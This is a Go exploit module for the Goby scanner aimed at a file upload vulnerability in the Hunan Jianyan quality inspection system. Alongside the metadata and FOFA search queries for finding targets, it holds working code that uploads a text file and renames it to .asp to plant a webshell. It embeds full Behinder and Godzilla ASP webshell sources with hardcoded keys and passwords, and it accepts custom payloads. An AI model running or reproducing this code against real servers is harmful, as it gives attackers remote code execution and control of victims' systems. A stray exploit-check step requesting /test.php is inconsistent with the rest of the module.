package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "hunan jianyan Quality inspection system /Applications/Attachment/upload.ashx file filename parameter File Upload Vulnerability",
    "Description": "<p>Hunan Jianyan Testing System is a system used for monitoring and managing product quality. It helps enterprises improve product quality, reduce quality issues and risks, and provide data support for decision-making and improvement by detecting and analyzing products</p><p>The/Applications/Attachment/upload.ashx file of Hunan Jianyan Detection System has a file upload function. Attackers can execute malicious code or obtain server control permissions by uploading a txt file and then modifying the file type using the act parameter of/Standard/Editor/API/File.cshtml</p>",
    "Product": "hunan jianyan Quality inspection system",
    "Homepage": "http://www.jyvjd.com/",
    "DisclosureDate": "2024-04-30",
    "PostTime": "2024-05-06",
    "Author": "15900373599@163.com",
    "FofaQuery": "body=\"/Content/Theme/Standard/webSite/login.css\" || body=\"/Content/Theme/Standard/webSite/images/bg.jpg\"",
    "GobyQuery": "body=\"/Content/Theme/Standard/webSite/login.css\" || body=\"/Content/Theme/Standard/webSite/images/bg.jpg\"",
    "Level": "2",
    "Impact": "<p>The/Applications/Attachment/upload.ashx file of Hunan Jianyan Detection System has a file upload function. Attackers can execute malicious code or obtain server control permissions by uploading a txt file and then modifying the file type using the act parameter of/Standard/Editor/API/File.cshtml</p>",
    "Recommendation": "<p>1. Verify the type of uploaded files. In addition to front-end verification, the backend still needs to perform verification. The backend can perform extension detection, file renaming, MIME type detection, and limit the size of uploaded files to defend against restrictions, or store the uploaded files in other files on the server; </p><p>2. Strictly limit and verify uploaded files, and prohibit uploading files with malicious code. Simultaneously restrict the execution permissions of the relevant uploaded file directory to prevent Trojan execution; </p><p>3. Strictly verify the format of uploaded files to prevent malicious script files from being uploaded; </p><p>4. Strictly limit the path of uploaded files;</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "<%Response.Write(\"Hello World\")%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Applications/Attachment/upload.ashx",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "ASP.NET_SessionId=tdvqgs3vjozapljtoh3gfetm",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data;boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR",
                    "Content-Length": "343"
                },
                "data_type": "text",
                "data": "\n​\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR\nContent-Disposition: form-data; name=\"file\";filename=\"0.txt\"\n\n​123\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR\nContent-Disposition: form-data; name=\"_upload_guid\"\n\n​0\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "files",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "湖南建研质量检测系统 /Applications/Attachment/upload.ashx 文件 filename 参数 文件上传漏洞",
            "Product": "湖南建研质量检测系统 ",
            "Description": "<p>湖南建研检测系统是一种用于监控和管理产品质量的系统,它通过对产品进行检测和分析,帮助企业提高产品质量,减少质量问题和风险,并提供数据支持用于决策和改进</p><p>湖南建研检测系统的/Applications/Attachment/upload.ashx文件存在文件上传功能,攻击者通过上传txt文件后再利用/Standard/Editor/API/File.cshtml的act参数实现文件类型的修改后,实现恶意代码执行或获取服务器控制权限<br></p>",
            "Recommendation": "<p>1.对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中；&nbsp;</p><p>2.严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行；&nbsp;</p><p>3.对上传文件格式进行严格校验，防止上传恶意脚本文件；&nbsp;</p><p>4.严格限制上传的文件路径；<br></p>",
            "Impact": "<p>湖南建研检测系统的/Applications/Attachment/upload.ashx文件存在文件上传功能,攻击者通过上传txt文件后再利用/Standard/Editor/API/File.cshtml的act参数实现文件类型的修改后,实现恶意代码执行或获取服务器控制权限<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "hunan jianyan Quality inspection system /Applications/Attachment/upload.ashx file filename parameter File Upload Vulnerability",
            "Product": "hunan jianyan Quality inspection system",
            "Description": "<p>Hunan Jianyan Testing System is a system used for monitoring and managing product quality. It helps enterprises improve product quality, reduce quality issues and risks, and provide data support for decision-making and improvement by detecting and analyzing products<br></p><p>The/Applications/Attachment/upload.ashx file of Hunan Jianyan Detection System has a file upload function. Attackers can execute malicious code or obtain server control permissions by uploading a txt file and then modifying the file type using the act parameter of/Standard/Editor/API/File.cshtml<br></p>",
            "Recommendation": "<p>1. Verify the type of uploaded files. In addition to front-end verification, the backend still needs to perform verification. The backend can perform extension detection, file renaming, MIME type detection, and limit the size of uploaded files to defend against restrictions, or store the uploaded files in other files on the server;&nbsp;</p><p>2. Strictly limit and verify uploaded files, and prohibit uploading files with malicious code. Simultaneously restrict the execution permissions of the relevant uploaded file directory to prevent Trojan execution;&nbsp;</p><p>3. Strictly verify the format of uploaded files to prevent malicious script files from being uploaded;&nbsp;</p><p>4. Strictly limit the path of uploaded files;<br></p>",
            "Impact": "<p>The/Applications/Attachment/upload.ashx file of Hunan Jianyan Detection System has a file upload function. Attackers can execute malicious code or obtain server control permissions by uploading a txt file and then modifying the file type using the act parameter of/Standard/Editor/API/File.cshtml<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10947"
}`
	uploadFileHttpXjhd63xcjq := func(hostInfo *httpclient.FixUrl, reqBody string, randomString string) string {
		httpConfig := httpclient.NewPostRequestConfig("/Applications/Attachment/upload.ashx")
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("Cache-Control", "max-age=0")
		httpConfig.Header.Store("Upgrade-Insecure-Requests", `1`)
		httpConfig.Header.Store("User-Agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`)
		httpConfig.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		httpConfig.Header.Store("Accept-Encoding", "gzip, deflate")
		httpConfig.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
		httpConfig.Header.Store("Connection", "close")
		httpConfig.Header.Store("Content-Type", "multipart/form-data;boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR")
		body := `` + "\r\n"
		body += `` + "\r\n"
		body += "\n​\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR\nContent-Disposition: form-data; name=\"file\";filename=\"" + randomString + ".txt\"\n\n" + reqBody + "\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR\nContent-Disposition: form-data; name=\"_upload_guid\"\n\n" + randomString + "\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--\n"
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return "nil"
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "files") {
			txtPath := regexp.MustCompile("(/tempData/[^/]+.txt)").FindStringSubmatch(string(resp.Utf8Html))
			if len(txtPath) > 1 {
				return txtPath[1]
			} else {
				return "n"
			}
		}
		return "a"
	}
	changeNameHttpXjhddccjq := func(hostInfo *httpclient.FixUrl, filePath string, randomString string) string {
		httpConfig := httpclient.NewPostRequestConfig("/Standard/Editor/API/File.cshtml?act=geturl")
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("Cache-Control", "max-age=0")
		httpConfig.Header.Store("Upgrade-Insecure-Requests", `1`)
		httpConfig.Header.Store("User-Agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`)
		httpConfig.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		httpConfig.Header.Store("Accept-Encoding", "gzip, deflate")
		httpConfig.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
		httpConfig.Header.Store("Connection", "close")
		httpConfig.Header.Store("X-Forwarded-Proto", "")
		httpConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		body := "filename=/tempData/" + randomString + ".asp&filetplpath=" + filePath
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return "nil"
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "asp") {
			shellPath := regexp.MustCompile("(http(.*).asp)").FindStringSubmatch(string(resp.Utf8Html))
			if len(shellPath) > 1 {
				return shellPath[1]
			} else {
				return ""
			}
		}
		return ""
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			custom := ss.Params["custom"].(string)
			var filePath string
			var shellPath string
			if attackType == "behinder" {
				rand.Seed(time.Now().UnixNano())
				randomNumber := rand.Intn(9000000000) + 1000000000
				randomString := strconv.Itoa(randomNumber)
				reqBody := `<% 
<!-- 
Response.CharSet = "UTF-8" 
BLh6ek="ab56b4d92b40713a"  
Session("k")=BLh6ek 
C9eX=Request.TotalBytes 
QNGSU=Request.BinaryRead(C9eX) 
For i=1 To C9eX 
LpG1Ix=ascb(midb(QNGSU,i,1)) Xor Asc(Mid(BLh6ek,(i and 15)+1,1))  
VSRBJ=VSRBJ + Chr(LpG1Ix) 
Next 
eXecUtE(VSRBJ)REM ) 
-->
%>`
				filePath = uploadFileHttpXjhd63xcjq(expResult.HostInfo, reqBody, randomString)
				shellPath = changeNameHttpXjhddccjq(expResult.HostInfo, filePath, randomString)
				expResult.Success = true
				expResult.Output = "WebShell URL: " + shellPath + "\r\n"
				expResult.Output += "Password:abcde\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType == "godzilla" {
				rand.Seed(time.Now().UnixNano())
				randomNumber := rand.Intn(9000000000) + 1000000000
				randomString := strconv.Itoa(randomNumber)
				reqBody := `<%
Set ABMR8 = Server.CreateObject("Scripting.Dictionary")

Function BO5991(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set CGDX = CreateObject("ADODB.Stream")
    CGDX.CharSet = "iso-8859-1"
    CGDX.Type = 2
    CGDX.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            CGDX.WriteText chrw(ascb(midb(content,i,1)))
        Next
    end if
    CGDX.Position = 0
    if isBin then
        CGDX.Type = 1
        BO5991=CGDX.Read()
    else
        BO5991=CGDX.ReadText()
    end if

End Function
    content = request.BinaryRead(request.TotalBytes)
    if len(request.Cookies.Item("pass"))>0  then
        if  IsEmpty(Session("load466Y")) then
            content=BO5991(content,false)
            Session("load466Y")=content
            response.End
        else
            ABMR8.Add "load466Y",Session("load466Y")
            Execute(ABMR8("load466Y"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite result
            end if
        end if
    end if
%>`
				filePath = uploadFileHttpXjhd63xcjq(expResult.HostInfo, reqBody, randomString)
				shellPath = changeNameHttpXjhddccjq(expResult.HostInfo, filePath, randomString)
				expResult.Success = true
				expResult.Output = "WebShell URL: " + shellPath + "\r\n"
				expResult.Output += "Password:pass 加密器：Godzilla_ASP_EVAL_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			} else if attackType == "custom" {
				rand.Seed(time.Now().UnixNano())
				randomNumber := rand.Intn(9000000000) + 1000000000
				randomString := strconv.Itoa(randomNumber)
				reqBody := custom
				filePath = uploadFileHttpXjhd63xcjq(expResult.HostInfo, reqBody, randomString)
				shellPath = changeNameHttpXjhddccjq(expResult.HostInfo, filePath, randomString)
				expResult.Success = true
				expResult.Output = "WebShell URL: " + shellPath + "\r\n"

			}
			expResult.Output += "Webshell type: asp"
			return expResult
		},
	))
}
